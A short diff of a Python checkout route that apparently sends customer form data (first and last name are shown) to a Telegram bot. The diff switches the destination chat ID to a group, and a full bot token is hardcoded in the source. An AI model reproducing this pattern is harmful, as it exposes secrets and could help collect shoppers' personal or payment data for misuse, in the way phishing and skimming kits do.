@@ -99,7 +99,7 @@ def checkout():
     if request.method == 'POST':
         # Telegram Bot Credentials - Replace these with your actual keys
         TELEGRAM_BOT_TOKEN = "8647260942:AAFV7D02rIE2HApyOiJSgNEK33UiMCMmnqw"
-        TELEGRAM_CHAT_ID = "1063853008"
+        TELEGRAM_CHAT_ID = "-1003914228040"
 
         first_name = request.form.get('firstName')
         last_name = request.form.get('lastName')
